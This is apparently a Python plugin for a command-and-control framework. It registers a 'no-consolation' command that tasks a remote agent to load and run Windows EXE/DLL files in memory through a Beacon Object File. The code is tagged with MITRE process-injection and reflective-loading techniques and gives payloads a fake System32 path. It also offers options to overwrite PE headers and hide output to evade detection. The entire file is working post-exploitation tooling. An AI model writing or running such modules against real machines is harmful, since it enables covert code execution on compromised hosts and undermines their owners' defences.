import conquest
import os.path 

def handler_noconsolation(agentId, cmdline, args): 
    path = conquest.get_string(args, 0)
    arguments = conquest.get_string(args, 1, "")
    local = conquest.get_bool(args, 2)
    inthread = conquest.get_bool(args, 3)
    link_to_peb = conquest.get_bool(args, 4)
    dont_unload = conquest.get_bool(args, 5)
    timeout = conquest.get_int(args, 6, 60)
    overwrite_headers = conquest.get_bool(args, 7)
    method = conquest.get_string(args, 8, "DllMain")
    unicode_args = conquest.get_bool(args, 9)
    no_output = conquest.get_bool(args, 10)
    alloc_console = conquest.get_bool(args, 11)
    close_handles = conquest.get_bool(args, 12)
    free_libraries = conquest.get_string(args, 13)
    dont_save = conquest.get_bool(args, 14)
    list_pes = conquest.get_bool(args, 15)
    unload_pe = conquest.get_string(args, 16)
    load_all_deps = conquest.get_bool(args, 17)
    load_all_deps_but = conquest.get_string(args, 18)
    load_deps = conquest.get_string(args, 19)
    search_paths = conquest.get_string(args, 20)

    pe_name = path.split("/")[-1]      # Extract PE file name

    if local:
        # PE exists locally on the target machine
        pe_path = path
        pe_bytes = b""
        pe_path_arg = path

    else:  
        # PE is sent over the network
        pe_path = "C:\\Windows\\System32\\" + pe_name     # Create 'fake' path for the PE
        pe_path_arg = ""

        if not os.path.exists(path):
            conquest.error(agentId, cmdline, f"Specified PE does not exist: {path}")
            return 
        
        with open(path, 'rb') as f: 
            pe_bytes = f.read() 

        if len(pe_bytes) <= 0: 
            conquest.error(agentId, cmdline, f"Could not read PE: {path}")
            return 

    pe_cmdline = pe_name
    if arguments:
        pe_cmdline += " " + arguments

    conquest.log("Input:" + path)
    conquest.log("Name:" + pe_name)
    conquest.log("Path:" + pe_path)
    conquest.log("Path2:" + pe_path_arg)
    conquest.log("cmdline:" + pe_cmdline)
    conquest.log("Bytes:" + str(len(pe_bytes)))

    bof = conquest.modules_root() + "/No-Consolation/dist/NoConsolation.x64.o"
    params = conquest.bof_pack("ZzZbziiiZzziiiiziizzziiizzzi", [
        pe_name,                            # Z: PE name (wide)
        pe_name,                            # z: PE name
        pe_path,                            # Z: PE path (wide)
        pe_bytes,                           # b: PE bytes
        pe_path_arg,                        # z: PE path argument (empty if PE is send remotely)
        int(local),                         # i: --local: Load from target machine
        timeout,                            # i: Timeout in seconds
        int(overwrite_headers),             # i: -k: overwrite PE headers
        pe_cmdline,                         # Z: Command line (wide)
        pe_cmdline,                         # z: Command line
        method,                             # z: Export method name
        int(unicode_args),                  # i: -w: use unicode arguments
        int(no_output),                     # i: --no-ouput: suppress output
        int(alloc_console),                 # i: --alloc-console: allocate console
        int(close_handles),                 # i: --clsoe-handles: close handles
        free_libraries,                     # z: --free-libraries: libraries to unload
        int(dont_save),                     # i: --dont-save: don't save in memory
        int(list_pes),                      # i: --list-pes: list loaded PEs
        unload_pe,                          # z: --unload-pe: PE to unload
        conquest.user(),                    # z: Username of the currently connected client  
        "",                                 # z: load time (tstamp(ticks()))
        int(link_to_peb),                   # i: --link-to-peb: link to PEB
        int(dont_unload),                   # i: --dont-unload: don't unload
        int(load_all_deps),                 # i: --load-all-depsendencies: load all dependencies
        load_all_deps_but,                  # z: --load-all-dependencies-but: dependencies to exclude
        load_deps,                          # z: --load-dependencies: dependencies to load
        search_paths,                       # z: --search-paths: custom search paths
        int(inthread)                       # i: --inthread: run in thread
    ])
    
    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")


cmd_noconsolation = (
    conquest.createCommand(name="no-consolation", description="Execute unmanaged PE in memory.", example="asd",
                           message="Tasked agent to execute an unmanaged PE in memory.", mitre=["T1055", "T1620"])
            .addArgString("path", "Full path to the windows EXE/DLL to be run in memory. If already loaded, you can simply specify the binary name.", True)
            .addArgString("arguments", "Arguments to pass to the binary.")
            .addFlagBool("--local", "local", "Load the binary from the target Windows machine.")
            .addFlagBool("--inthread", "inthread", "Run the PE with the main thread (may hang the agent).")
            .addFlagBool("--link-to-peb", "link-to-peb", "Load the PE into the PEB.")
            .addFlagBool("--dont-unload", "dont-unload", "Don't unload the DLL after execution.")
            .addFlagInt("--timeout", "timeout", "Timeout in seconds to wait for PE completion (default: 60, 0 to disable).")
            .addFlagBool("-k", "overwrite-headers", "Overwrite the PE headers.")
            .addFlagString("--method", "method", "Export method/function name to execute for DLLs (default: DllMain).")
            .addFlagBool("-w", "unicode-args", "Pass command line arguments in UNICODE format (default: ANSI).")
            .addFlagBool("--no-output", "no-output", "Do not capture output.")
            .addFlagBool("--alloc-console", "alloc-console", "Allocate a console (spawns new process).")
            .addFlagBool("--close-handles", "close-handles", "Close pipe handles after execution.")
            .addFlagString("--free-libraries", "free-libraries", "Comma-separated list of DLLs to offload from memory.")
            .addFlagBool("--dont-save", "dont-save", "Do not save this binary in memory.")
            .addFlagBool("--list-pes", "list-pes", "List all PEs loaded in memory.")
            .addFlagString("--unload-pe", "pe-name", "Unload a specific PE from memory by name.")
            .addFlagBool("--load-all-dependencies", "deps", "Custom load all PE dependencies.")
            .addFlagString("--load-all-dependencies-but", "deps", "Custom load all dependencies except specified (comma-separated).")
            .addFlagString("--load-dependencies", "deps", "Custom load specified dependencies (comma-separated).")
            .addFlagString("--search-paths", "paths", "Custom search paths for DLLs (comma-separated).")
            .setHandler(handler_noconsolation))

conquest.registerModule(
    name="no-consolation", 
    description="Execute unmanaged EXE/DLL in memory.", 
    group="execution", 
    commands=[cmd_noconsolation])